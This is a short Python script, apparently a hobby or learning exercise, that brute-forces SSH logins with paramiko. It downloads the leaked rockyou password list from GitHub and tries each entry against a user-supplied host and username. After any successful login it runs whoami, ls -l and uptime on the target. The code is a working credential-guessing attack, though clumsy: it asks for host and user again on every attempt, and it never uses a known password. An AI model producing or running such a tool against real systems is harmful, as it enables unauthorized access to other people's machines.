#!/usr/bin/python3

# used the demo script

import time
import paramiko
import getpass
import wget
import tarfile
import gzip
import shutil

  
def getHost():
    host = input("Please provide an IP address to connect to:") or "192.168.1.xx"
    return host

def getUser():
    user = input("Please provide a username:")
    return user

def passIterator():
    def mode1PrepA():
        password_list = []
        gate = input("do you have a dictionary file (y) or do you need to download one (n)? ")
        if gate.lower() == 'n':
            url = "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz"

            gz_target = wget.download(url)
            tar_target = gz_target[:-3]

            with gzip.open(gz_target, 'rb') as f_in:
                with open(tar_target, 'wb') as f_out:
                    shutil.copyfileobj(f_in, f_out)

            with tarfile.open(tar_target, "r:") as tar_ref:
                tar_ref.extractall()
                filename = tar_ref.getnames()[0]  
        
        elif gate.lower() == 'y':
            filename = input("enter a dictionary file in absolute path: ")
    
        with open(filename, 'r') as F:
            while True:
                line = F.readline()
                if not line:
                    break
                line = line.rstrip()
                password_list.append(line)

        return password_list
    
    password_list = mode1PrepA()
    return password_list

def sshAttempt():

    port = 22

    # Create object of SSHCLient and connect to SSH
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    gate = input("Do you know the password? y/n")
    if gate.lower() == 'y':
        password = getpass.getpass(prompt="Please provide a password:")
    elif gate.lower() == 'n':
        
        password_list = passIterator()

        for word in password_list:
            password = word
            try:
                ssh.connect(getHost(), port, getUser(), password)
                stdin, stdout, stderr = ssh.exec_command("whoami")
                time.sleep(3)
                output = stdout.read()
                print("*~#~*" * 25)
                print(output)
                stdin, stdout, stderr = ssh.exec_command("ls -l")
                time.sleep(3)
                output = stdout.read()
                print(output)
                stdin, stdout, stderr = ssh.exec_command("uptime")
                time.sleep(3)
                output = stdout.read()
                print(output)
                print("*~#~*" * 25)

            except paramiko.AuthenticationException as e:
                print("Authentication Failed!")
                print(e)

            ssh.close()
            time.sleep(2)
